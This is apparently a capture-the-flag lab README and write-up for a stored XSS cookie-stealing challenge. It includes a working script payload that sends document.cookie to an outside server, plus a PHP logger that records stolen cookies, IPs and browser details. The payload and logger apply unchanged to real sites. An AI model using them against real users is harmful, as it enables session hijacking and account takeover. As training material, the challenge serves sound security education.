# XSS Cookie Stealer Challenge

## Description

This is a classic XSS attack. Find and exploit an XSS vulnerability to steal the admin's session ID. The admin will view this page every 10 seconds. 
Once you have their session ID, log in as admin and capture the flag.

## Prerequisites

1. Download and install phantom.js. http://phantomjs.org/download.html
1. Run the run.bat or run.sh script to continuously load the vulnerable page as admin.

## Write-Up

The index page allows you to anonymously post comments. These comments are not HTML-encoded, which means it is vulnerable to an XSS attack.
Inject some javascript that will grab the cookie and send it to your own server to save it. Example:

    <script>new Image().src="http://192.168.33.10/exploits/cookie-stealer.php?c="+document.cookie</script>
	
You will need a web service that you can pass the cookie to. Example:

    <?php
	    $cookie = $_GET['c'];
	    $date = date("j F, Y, g:i a");;
	    $referer = getenv('HTTP_REFERER');
	    $userip = getenv('REMOTE_ADDR');
	    $userbrowser = getenv('HTTP_USER_AGENT');
	    $fp = fopen('cookies.txt', 'a');
	    fwrite($fp, '***|Cookie: '.$cookie.'|Date: '.$date.'|Referer: '.$referer.'|IP: '.$userip.'|Browser: '.$userbrowser.'|***'."\n");
	    fclose($fp);
    ?>

The challenge will automatically load the page as admin, so if your script works you should get the admin's cookie.
Add the cookie to your browser, and refresh the page. If it works, you will see the flag at the top of the page.